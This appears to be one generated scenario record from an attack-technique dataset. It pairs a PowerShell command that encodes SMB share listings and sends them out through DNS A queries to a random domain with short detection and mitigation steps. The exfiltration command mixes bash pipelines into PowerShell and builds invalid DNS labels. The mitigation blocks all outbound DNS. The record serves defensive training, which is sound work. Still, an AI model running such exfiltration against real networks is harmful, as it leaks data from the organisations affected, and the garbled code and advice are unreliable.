---
type: campaign
scenario_id: 461
tactic: Exfiltration
technique: "T1048.003: Exfiltration Over Alternative Protocol"
technique_id: T1048.003
tags: [campaign, lotl, exfiltration]
---

# Using PowerShell to exfiltrate network shares via DNS A queries.

## Threat Description
Using PowerShell to exfiltrate network shares via DNS A queries.

## Attack Command
```
powershell -c "$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; $shares = Get-SmbShare | Out-String; $enc = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($shares)); Resolve-DnsName -Type A $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$enc.$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com) | Out-Null"
```

## Detection Logic
Monitor shares DNS: `wmic process where name='powershell.exe' get commandline | findstr Get-SmbShare`; DNS A spikes: `tshark -Y 'dns.qry.type == 1'`.

## Mitigation
Restrict PowerShell: `Set-ExecutionPolicy Restricted`; Block suspicious DNS: `netsh advfirewall firewall add rule name='Block A DNS' dir=out action=block protocol=UDP remoteport=53`.

## AI Training Prompt
Train AI to detect PowerShell network shares exfiltration via DNS A queries by analyzing base64-encoded subdomains, Get-SmbShare execution, and DNS traffic patterns; suggest DNS filtering.

## References
- MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/
- CWE-200: https://cwe.mitre.org/data/definitions/200.html
